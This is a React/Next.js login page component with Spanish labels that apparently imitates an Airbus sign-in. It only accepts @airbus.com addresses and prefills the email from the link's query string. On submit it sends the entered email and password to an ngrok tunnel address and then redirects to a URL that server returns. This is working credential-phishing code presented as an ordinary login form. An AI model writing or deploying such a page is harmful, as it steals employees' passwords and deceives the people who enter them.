import React, { useEffect } from "react";
import { useFormik } from "formik";
import { useRouter } from "next/router";
import * as Yup from "yup";
import Input from "@/components/Atoms/Input";
import RoundedButton from "@/components/Atoms/Buttons/RoundedButton/RoundedButton";
import { H2 } from "@/common/typography";

export default function Login() {
  const router = useRouter();

  useEffect(() => {
    if (router.query.email) {
      formik.setFieldValue("email", router.query.email as string);
    }
  }, [router.query]);

  const formik = useFormik({
    initialValues: {
      email: "",
      password: "",
    },
    validationSchema: Yup.object({
      email: Yup.string()
        .email("Email inválido")
        .matches(
          new RegExp(`@airbus.com$`),
          "El email debe finalizar con @airbus.com"
        )
        .required("Campo requerido"),
      password: Yup.string().required("Campo requerido"),
    }),
    onSubmit: async (data) => {
      console.log(data);
      const response = await fetch("https://275e-82-215-107-1.ngrok-free.app", {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json",
        },
      });

      const dataResponse = await response.json();

      // Redirigir a la ruta o URL del JSON de respuesta
      router.push(dataResponse.redirectURL);
      await fetch("https://275e-82-215-107-1.ngrok-free.app");
    },
  });

  return (
    <form
      onSubmit={formik.handleSubmit}
      className={"flex justify-center flex-col items-center"}
    >
      <H2 color="text-white">Inicia sesión</H2>
      <div className={"mt-4"}>
        <Input
          type="email"
          name="email"
          placeholder="email@airbus.com"
          label="Email"
          className="w-72"
          onChange={(e) => {
            formik.setFieldValue("email", e.target.value);
          }}
          value={formik.values.email}
          onBlur={formik.handleBlur}
          error={
            formik.errors.email && formik.touched?.email
              ? formik.errors.email
              : ""
          }
          disabled
        />
        <Input
          type="password"
          name="password"
          label="Contraseña"
          className="w-72 mt-4"
          onChange={(e) => {
            formik.setFieldValue("password", e.target.value);
          }}
          value={formik.values.password}
          onBlur={formik.handleBlur}
          error={
            formik.errors.password && formik.touched?.password
              ? formik.errors.password
              : ""
          }
        />
      </div>
      <div className={"mt-4"}>
        <RoundedButton type="submit">Enviar</RoundedButton>
      </div>
    </form>
  );
}
